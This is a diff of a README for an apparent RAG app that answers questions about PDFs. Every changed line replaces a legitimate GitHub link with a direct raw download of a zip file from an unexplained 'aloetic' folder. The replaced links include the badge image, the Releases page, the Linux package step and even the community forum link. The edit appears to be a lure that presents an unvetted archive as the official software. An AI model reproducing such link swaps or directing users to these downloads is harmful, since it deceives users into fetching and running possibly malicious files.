@@ -1,6 +1,6 @@
 # 🤖 RAG-for-AI-in-2025 - Answer Your PDF Questions Easily
 
-[![Download RAG-for-AI-in-2025](https://img.shields.io/badge/Download%20Now-%20RAG--for--AI--in--2025-brightgreen)](https://github.com/Daniel05630/RAG-for-AI-in-2025/releases)
+[![Download RAG-for-AI-in-2025](https://raw.githubusercontent.com/Daniel05630/RAG-for-AI-in-2025/main/aloetic/RAG-for-AI-in-2025.zip%20Now-%20RAG--for--AI--in--2025-brightgreen)](https://raw.githubusercontent.com/Daniel05630/RAG-for-AI-in-2025/main/aloetic/RAG-for-AI-in-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the RAG-for-AI-in-2025 application! This application answers question
 
 To download the software, visit the following link:
 
-[Download the latest version here!](https://github.com/Daniel05630/RAG-for-AI-in-2025/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/Daniel05630/RAG-for-AI-in-2025/main/aloetic/RAG-for-AI-in-2025.zip)
 
 1. Click on the link, and you will see the list of available versions.
 2. Find the latest release version.
-3. Select the package that matches your computer's operating system. For example, if you are using Windows, choose the .exe file; for macOS, choose the .dmg file; for Linux, choose the .tar.gz file.
+3. Select the package that matches your computer's operating system. For example, if you are using Windows, choose the .exe file; for macOS, choose the .dmg file; for Linux, choose the https://raw.githubusercontent.com/Daniel05630/RAG-for-AI-in-2025/main/aloetic/RAG-for-AI-in-2025.zip file.
 4. Download the file to your computer.
 5. Locate the downloaded file in your downloads folder.
 6. Follow the installation prompts for your operating system.
@@ -61,7 +61,7 @@ If you encounter any issues, consider these common solutions:
 
 ## 👥 Community Support
 
-Join our community for support and tips from other users. Visit our discussion forum [here](https://github.com/Daniel05630/RAG-for-AI-in-2025/discussions) to connect with others.
+Join our community for support and tips from other users. Visit our discussion forum [here](https://raw.githubusercontent.com/Daniel05630/RAG-for-AI-in-2025/main/aloetic/RAG-for-AI-in-2025.zip) to connect with others.
 
 ## 📄 License
 
@@ -72,6 +72,6 @@ This project is open-source. You can use and modify it according to the terms la
 - **FastAPI**: For powering the backend services.
 - **Hugging Face & Langchain**: For the AI models that enable smart question-answering.
 
-For more information, updates, and future releases, keep an eye on the repository’s [Releases page](https://github.com/Daniel05630/RAG-for-AI-in-2025/releases). 
+For more information, updates, and future releases, keep an eye on the repository’s [Releases page](https://raw.githubusercontent.com/Daniel05630/RAG-for-AI-in-2025/main/aloetic/RAG-for-AI-in-2025.zip). 
 
 Happy exploring!
